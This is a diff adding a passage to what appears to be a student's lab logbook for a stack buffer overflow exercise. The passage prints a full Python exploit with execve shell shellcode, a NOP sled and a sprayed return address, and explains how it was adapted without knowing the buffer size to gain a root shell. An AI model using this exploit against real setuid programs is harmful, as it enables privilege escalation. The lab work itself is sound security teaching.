@@ -251,6 +251,54 @@ $./stack-L1
 
 ## Task 4: Launching Attack without Knowing Buffer Size (Level 2)
 
+1. For this task, we reused the exploit.py and changed it into the exploit1.py file:
+
+```pyhton
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)               
+content[start:] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffca90 + 400
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+
+for offset in range(50):
+  content[offset*L:offset*4 + L] = (ret).to_bytes(L, byteorder='little')
+
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+2. Explaining the changes made:
+    - We ran `gdb stack-L2-dbg` again and we verified that the $buffer variable was now `0xffffca90`. Because of that we changed the value of the `ret` variable to that address and added 400 since ...
+    - We maintained the value of start so that the shellcode situates at the end of the buffer
+    - Since now we only know the address of the buffer (and not the frame pointer), we need a new way of attempting to overflow the buffer. To reach that objetive this portion of code became really useful `for offset in range(50):
+  content[offset*L:offset*4 + L] = (ret).to_bytes(L, byteorder='little'). The goal is to overwrite multiple return address slots in the buffer with the same calculated value, which is the address that we want the program to jump to when returning from a function
+
+3. After running the exploit, we checked for the ids and if we had root access:
+
+![runExploit1](/Logbooks/img/Week5/runExploit1.png)
+
 
 
 # CTF - Control The Flag
